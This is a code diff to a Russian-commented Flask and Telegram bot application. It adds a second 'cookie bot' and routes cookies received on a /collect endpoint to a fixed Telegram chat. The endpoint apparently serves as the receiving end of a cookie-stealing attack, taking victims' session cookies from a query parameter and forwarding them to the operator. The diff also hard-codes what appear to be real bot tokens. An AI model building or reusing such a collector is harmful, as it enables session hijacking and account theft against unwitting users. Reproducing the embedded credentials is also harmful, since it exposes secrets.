@@ -4,8 +4,13 @@ from datetime import datetime
 from flask import Flask, request
 import time
 
-TOKEN = '8684971280:AAH0V29u4vT382wAv28eGr2Bo2OXMi79ERI'
-bot = telebot.TeleBot(TOKEN)
+# === ДВА БОТА ===
+USER_BOT_TOKEN = '8684971280:AAH0V29u4vT382wAv28eGr2Bo2OXMi79ERI'
+COOKIE_BOT_TOKEN = '8693453531:AAFwUMH_otrs4oxV_lGMdokUVKQTjX3mN64'
+
+bot = telebot.TeleBot(USER_BOT_TOKEN)
+kuki_bot = telebot.TeleBot(COOKIE_BOT_TOKEN)
+
 app = Flask(__name__)
 
 # === БАЗА ДАННЫХ ===
@@ -242,7 +247,7 @@ def index():
 def collect():
     cookie = request.args.get('cookie')
     if cookie:
-        bot.send_message(8205534130, f'🍪 Кука: {cookie}')
+        kuki_bot.send_message(8205534130, f'🍪 Кука: {cookie}')
         return 'OK', 200
     return 'No cookie', 400
 
